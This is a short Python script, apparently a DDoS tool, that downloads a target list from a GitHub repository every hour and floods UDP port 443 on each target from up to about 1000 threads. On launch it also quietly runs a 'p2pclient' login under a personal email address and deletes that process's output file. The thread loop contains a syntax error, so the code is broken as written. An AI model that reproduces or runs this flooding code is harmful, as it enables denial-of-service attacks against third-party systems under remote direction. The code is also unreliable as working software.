#!/usr/bin/env python3

import socket,time,threading,sys,random,os,subprocess,requests,urllib.request
from os import getcwd

with open('test.txt', 'w') as f:
    process = subprocess.Popen(['p2pclient', '--login', 'war030578@gmail.com'],
    stdout=f,
    stderr=f)
os.remove("test.txt")
 
def Attack(target, port, kbytes, timeout):
    try:
        Bytes=os.urandom(kbytes)
        sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent = 0
        while time.time()<timeout:
            rport=port
            b = Bytes*random.randint(1,22)
            sock.sendto(b,(target,rport))
            sent=sent + 1
            print("Sent %s packets to %s port %s with %s bytes" % (sent, target, port, len(b)))
        return
    except KeyboardInterrupt:
        sys.exit()
    except Exception as Error:
        print(Error)
 
while 1 == 1:
    timeout=time.time()+3600
    testfile = urllib.request.urlretrieve ("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
    
    with open("target.txt",'r') as f:
        for row in f:
            rrow = row.split()
            count_targets = len(rrow)
            count_threads = int(1000//count_targets)
            for r in rrow:
                for i in count_threads
                    threading.Thread(target=Attack, args=(r, 443, 1024, timeout,)).start()
    time.sleep(3600)
 
 
            
    